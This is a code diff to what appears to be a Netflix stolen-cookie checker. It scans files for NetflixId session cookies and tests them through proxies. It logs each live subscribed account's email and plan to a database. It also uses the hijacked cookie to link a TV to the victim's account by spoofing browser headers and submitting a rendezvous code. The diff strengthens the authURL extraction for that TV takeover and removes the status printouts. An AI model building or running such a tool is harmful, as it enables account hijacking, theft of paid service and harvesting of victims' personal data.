@@ -9,6 +9,7 @@ import io
 from queue import Queue, Empty
 from datetime import datetime
 from typing import Any, Dict, List, Optional
+from urllib.parse import unquote
 import requests
 
 # ==========================================
@@ -91,7 +92,6 @@ def get_public_ip(proxies):
 # --- FLAWLESS COOKIE EXTRACTOR ---
 # ==========================================
 def extract_ids_from_bytes(file_bytes: bytes, filename: str) -> set:
-    # BUG FIX: This regex flawlessly grabs the ENTIRE cookie without truncating it
     pattern = re.compile(r"(NetflixId=[^\s;\"']+)")
     unique_ids = set()
     filename = filename or ""
@@ -223,14 +223,11 @@ def perform_extraction(html: str, original_id: str, processed_guids: set, guid_l
     plan_f = fields.get("currentPlan", {}).get("fields", {})
 
     email_value = (get_path(curr_prof, ["growthEmail", "email", "value"]) or "").strip().lower()
-    user_guid = growth.get("ownerGuid") or curr_prof.get("guid") or "Unknown"
     
-    duplicate_key = email_value if email_value else user_guid
     with guid_lock:
-        if duplicate_key != "Unknown" and duplicate_key in processed_guids:
+        if original_id in processed_guids:
             return "DUPLICATE", None, None, False, False, {}
-        if duplicate_key != "Unknown":
-            processed_guids.add(duplicate_key)
+        processed_guids.add(original_id)
 
     raw_plan_name = plan_f.get("localizedPlanName", {}).get("value") or get_path(growth, ["currentPlan", "plan", "name"]) or ""
     canonical_plan, display_lang = analyze_plan_and_language(raw_plan_name)
@@ -284,7 +281,6 @@ def perform_extraction(html: str, original_id: str, processed_guids: set, guid_l
     out.append(bullet("Profiles", ", ".join(p_parts)))
     out.append("---------------------------------\n")
     
-    # Store the exact CLI text natively in the API JSON response
     db_data = {
         "netflix_id": f"NetflixId={original_id}",
         "email": email_value,
@@ -335,7 +331,6 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
 
                 if "login" in response.url.lower():
                     with print_lock:
-                        print(f"[DEAD] {clean_id[:20]}... -> Redirected to login")
                         stats["dead"] += 1
                 elif '"graphql":' in response.text:
                     result_text, plan_name, quality, is_subscribed, is_on_hold, db_data = perform_extraction(
@@ -344,27 +339,22 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
                     
                     with print_lock:
                         if result_text == "DUPLICATE":
-                            print(f"[DUPLICATE] {clean_id[:20]}... -> Already checked")
                             stats["duplicates"] += 1
                         elif result_text == "ERROR":
-                            print(f"[ERROR] {clean_id[:20]}... -> Missing GraphQL Data")
                             stats["errors"] += 1
                         else:
-                            print(result_text)
                             if is_on_hold: stats["holds"] += 1
                             if is_subscribed:
                                 stats["hits"] += 1
                                 stats["qualities"][quality] = stats["qualities"].get(quality, 0) + 1
                                 stats["plans"][plan_name] = stats["plans"].get(plan_name, 0) + 1
                                 
-                                # --- ONLY SAVE VALID GOOD HITS TO DB ---
                                 if not is_on_hold and db_callback:
                                     db_callback(db_data)
                             else:
                                 stats["free"] += 1
                 else:
                     with print_lock:
-                        print(f"[UNKNOWN] {clean_id[:20]}... -> Page loaded but missing graphql data.")
                         stats["unknown"] += 1
                 
                 success = True
@@ -379,66 +369,137 @@ def check_worker(q: Queue, print_lock: threading.Lock, stats: dict, proxies: lis
 
         if not success:
             with print_lock:
-                print(f"[ERROR] Connection failed for {clean_id[:20]}... after {max_retries} attempts -> {last_error}")
                 stats["errors"] += 1
 
         q.task_done()
 
 # ==========================================
-# --- DYNAMIC TV AUTOMATION (WITH REFRESH) ---
+# --- DEEP AUTH URL EXTRACTORS ---
+# ==========================================
+def _deep_find_key(obj, target_key):
+    if isinstance(obj, dict):
+        for key, value in obj.items():
+            if key == target_key and value:
+                return value
+            result = _deep_find_key(value, target_key)
+            if result: return result
+    elif isinstance(obj, list):
+        for item in obj:
+            result = _deep_find_key(item, target_key)
+            if result: return result
+    return None
+
+def find_auth_in_react_context(html):
+    patterns = [
+        r'netflix\.reactContext\s*=\s*({.+?})\s*;?\s*</script>',
+        r'netflix\.appContext\s*=\s*({.+?})\s*;?\s*</script>',
+    ]
+    for pattern in patterns:
+        m = re.search(pattern, html, re.DOTALL)
+        if not m: continue
+        try:
+            context = json.loads(m.group(1))
+        except json.JSONDecodeError: continue
+        auth = _deep_find_key(context, "authURL")
+        if auth: return auth
+    return None
+
+def find_auth_in_html(html):
+    patterns = [
+        r'name="authURL"[^>]*value="([^"]+)"',
+        r'value="([^"]+)"[^>]*name="authURL"',
+        r'"authURL"\s*:\s*"([^"]+)"',
+        r"'authURL'\s*:\s*'([^']+)'",
+        r'authURL=([^\s&"<>]+)',
+    ]
+    for pattern in patterns:
+        m = re.search(pattern, html)
+        if m: return unquote(m.group(1))
+    return None
+
+# ==========================================
+# --- ROBUST DYNAMIC TV AUTOMATION ---
 # ==========================================
 def automate_tv_login(netflix_id: str, tv_code: str, proxies: list = None) -> tuple:
     clean_id = netflix_id.replace("NetflixId=", "").strip()
     session = requests.Session()
     
-    session.headers.update({
-        'authority': 'www.netflix.com',
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-        'accept-language': 'en-US,en;q=0.9',
-        'cache-control': 'max-age=0',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://www.netflix.com',
-        'referer': 'https://www.netflix.com/tv2',
-        'sec-ch-ua': '"Chromium";v="137"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
-    })
+    # Exact headers required to spoof the TV rendezvous request securely
+    headers = {
+        "authority":                  "www.netflix.com",
+        "accept":                     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        "accept-language":            "en-US,en;q=0.9",
+        "cache-control":              "max-age=0",
+        "sec-ch-ua":                  '"Chromium";v="137", "Not/A)Brand";v="24"',
+        "sec-ch-ua-mobile":           "?0",
+        "sec-ch-ua-model":            '""',
+        "sec-ch-ua-platform":         '"Linux"',
+        "sec-ch-ua-platform-version": '""',
+        "sec-fetch-dest":             "document",
+        "sec-fetch-mode":             "navigate",
+        "sec-fetch-site":             "same-origin",
+        "sec-fetch-user":             "?1",
+        "upgrade-insecure-requests":  "1",
+        "user-agent":                 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+    }
     
+    session.headers.update(headers)
     session.cookies.set("NetflixId", clean_id, domain=".netflix.com")
     proxy = random.choice(proxies) if proxies else None
 
     try:
-        # 1. This GET request forces Netflix to refresh the session cookies
+        # Step 1: Hit home page to refresh secure session cookies
         session.get("https://www.netflix.com/", proxies=proxy, timeout=15)
         
-        # Extract the newly refreshed NetflixId provided by the server
+        # Grab newly assigned NetflixId
         refreshed_id = session.cookies.get("NetflixId") or clean_id
         refreshed_cookie_string = f"NetflixId={refreshed_id}"
 
+        # Step 2: Fetch the hidden authURL from the /tv8 path
         res_tv8 = session.get("https://www.netflix.com/tv8", proxies=proxy, timeout=15)
-        rc_obj = find_object_after_marker(res_tv8.text, "netflix.reactContext")
-        rc_root = safe_load_json(rc_obj) if rc_obj else {}
         
-        auth_url = get_path(rc_root, ["models", "signupContext", "data", "flow", "authURL"])
-        
-        if not auth_url: 
-            return False, "Failed to extract dynamic authURL. Cookie might be dead.", refreshed_cookie_string
-
-        payload = {
-            'flow': 'websiteSignUp', 'authURL': auth_url,
-            'flowMode': 'enterTvLoginRendezvousCode', 'withFields': 'tvLoginRendezvousCode,isTvUrl2',
-            'code': tv_code, 'tvLoginRendezvousCode': tv_code, 'isTvUrl2': 'true', 'action': 'nextAction'
-        }
-        res_tv2 = session.post("https://www.netflix.com/tv2", data=payload, proxies=proxy, timeout=15)
-        
-        # --- STRICT URL SUCCESS CHECK ---
-        if "tv/out/success" in res_tv2.url.lower(): 
-            return True, "Login successful!", refreshed_cookie_string
+        # Try both the deep-search React parser and HTML regex fallbacks
+        auth_url = find_auth_in_react_context(res_tv8.text)
+        if not auth_url:
+            auth_url = find_auth_in_html(res_tv8.text)
             
-        return False, f"Failed. Final URL was: {res_tv2.url}", refreshed_cookie_string
+        if not auth_url:
+            return False, "Failed to extract dynamic authURL. The cookie session may be expired or invalid.", refreshed_cookie_string
+
+        # Step 3: Build the payload and submit TV Code
+        post_data = {
+            "flow":                  "websiteSignUp",
+            "authURL":               auth_url,
+            "flowMode":              "enterTvLoginRendezvousCode",
+            "withFields":            "tvLoginRendezvousCode,isTvUrl2",
+            "code":                  tv_code,
+            "tvLoginRendezvousCode": tv_code,
+            "action":                "nextAction",
+        }
+        
+        post_headers = dict(headers)
+        post_headers.update({
+            "content-type": "application/x-www-form-urlencoded",
+            "origin":       "https://www.netflix.com",
+            "referer":      "https://www.netflix.com/tv8",
+        })
+
+        res_post = session.post(
+            "https://www.netflix.com/tv8",
+            headers=post_headers,
+            data=post_data,
+            proxies=proxy,
+            timeout=15,
+            allow_redirects=True
+        )
+        
+        # Step 4: Strict validation check
+        final_url = res_post.url.rstrip('/').split('?')[0].lower()
+        
+        if final_url == "https://www.netflix.com/tv/out/success":
+            return True, "Login successful! Your TV is ready to watch.", refreshed_cookie_string
+        else:
+            return False, "That TV code wasn't right. Please verify the code and try again.", refreshed_cookie_string
+            
     except Exception as e:
         return False, f"Network Error: {str(e)}", netflix_id
-
